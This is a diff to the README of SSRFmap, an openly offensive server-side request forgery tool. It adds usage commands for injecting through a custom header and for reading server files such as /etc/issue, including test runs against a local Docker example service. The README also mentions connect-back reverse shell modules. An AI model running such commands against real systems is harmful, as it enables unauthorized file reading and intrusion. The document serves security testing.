@@ -108,6 +108,12 @@ Use the `-m` followed by module name (separated by a `,` if you want to launch s
 python ssrfmap.py -r examples/request.txt -p url -m readfiles,portscan
 ```
 
+If you want to inject inside a header, a GET or a POST parameter, you only need to specify the parameter name
+
+```powershell
+python ssrfmap.py -r examples/request6.txt -p X-Custom-Header -m readfiles --rfiles /tmp/test
+```
+
 If you need to have a custom user-agent use the `--uagent`. Some targets will use HTTPS, you can enable it with `--ssl`.
 
 ```powershell
@@ -115,7 +121,7 @@ If you need to have a custom user-agent use the `--uagent`. Some targets will us
 python ssrfmap.py -r examples/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"
 ```
 
-Some modules allow you to create a connect back, you have to specify LHOST and LPORT. Also SSRFmap can listen for the incoming reverse shell.
+Some modules allow you to create a connect back, you have to specify `LHOST` and `LPORT`. Also SSRFmap can listen for the incoming reverse shell.
 
 ```powershell
 # Triggering a reverse shell on a Redis
@@ -147,6 +153,17 @@ A quick way to test the framework can be done with `data/example.py` SSRF servic
   docker run -it -v $(pwd):/usr/src/app --name example ssrfmap examples/example.py
   docker exec -it example python ssrfmap.py -r examples/request.txt -p url -m readfiles
   ```
+
+Launch the tests requests:
+
+```ps1
+docker exec -it example python ssrfmap.py -r examples/request.txt -p url -m readfiles --rfiles /etc/issue
+docker exec -it example python ssrfmap.py -r examples/request2.txt -p url -m readfiles --rfiles /etc/issue
+docker exec -it example python ssrfmap.py -r examples/request3.txt -p url -m readfiles --rfiles /etc/issue
+docker exec -it example python ssrfmap.py -r examples/request4.txt -p url -m readfiles --rfiles /etc/issue
+docker exec -it example python ssrfmap.py -r examples/request5.txt -p url -m readfiles --rfiles /etc/issue
+docker exec -it example python ssrfmap.py -r examples/request6.txt -p X-Custom-Header -m readfiles --rfiles /etc/issue
+```
 
 
 ## Contribute
